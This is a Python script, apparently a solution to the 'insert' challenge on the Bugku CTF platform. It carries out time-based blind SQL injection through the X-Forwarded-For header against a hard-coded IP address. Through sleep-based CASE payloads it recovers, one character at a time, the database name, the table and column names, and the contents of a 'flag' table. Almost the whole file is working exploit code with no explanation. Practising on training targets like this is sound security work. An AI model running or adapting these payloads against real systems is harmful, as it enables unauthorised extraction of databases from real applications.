import requests
import time 
import queue

#此脚本为  bugku中insert题的payload



s = requests.session()
url = 'http://123.206.87.240:8002/web15/'

len_database = {
    'X-Forwarded-For':'127.0.0.1\'+(select case when length(database())=1 then sleep(5) else 1 end)+\'1',
    'User-Agent':'User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5'
}
len_database = {
    'X-Forwarded-For':'127.0.0.1\'+(select case when database()=\'WEB15\' then sleep(5) else 1 end)+\'1',
    'User-Agent':'User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5'
}
len_database = {
    'X-Forwarded-For':'127.0.0.1\'+(select case when (select count(table_name) from information_schema.tables where table_schema=database())=2 then sleep(5) else 1 end)+\'1',
    'User-Agent':'User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5'
}


for y in range(1,40):
    print("正在搜寻第%s个字符"%(y))
    for x in range(32,126):
        # x = 44
        headers = {
        'X-Forwarded-For':'127.0.0.1\'+(select case when substr((select database()) from %s for 1)=\'%s\' then sleep(5) else 1 end)+\'1'%(y,chr(x)),
        'User-Agent':'User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5'
        }
        headers = {
        'X-Forwarded-For':'127.0.0.1\'+(select case when substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %s for 1)=\'%s\' then sleep(5) else 1 end)+\'1'%(y,chr(x)),
        'User-Agent':'User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5'
        }
        headers = {
        'X-Forwarded-For':'127.0.0.1\'+(select case when substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\'flag\') from %s for 1)=\'%s\' then sleep(5) else 1 end)+\'1'%(y,chr(x)),
        'User-Agent':'User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5'
        }
        headers = {
        'X-Forwarded-For':'127.0.0.1\'+(select case when substr((select group_concat(flag) from flag) from %s for 1)=\'%s\' then sleep(5) else 1 end)+\'1'%(y,chr(x)),
        'User-Agent':'User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5'
        }
        start_time = time.time()
        r = s.get(url,headers=headers)
        end_time = time.time()
        time_len = end_time - start_time
        if time_len > 5:
            print(y,chr(x))
            with open('results.txt','a') as  f:
                f.write(chr(x).lower())
            break
# start_t = time.time()
# r = s.get(url,headers=len_database)
# end_t = time.time()
# time_ = end_t - start_t
# print(time_)
print("结束")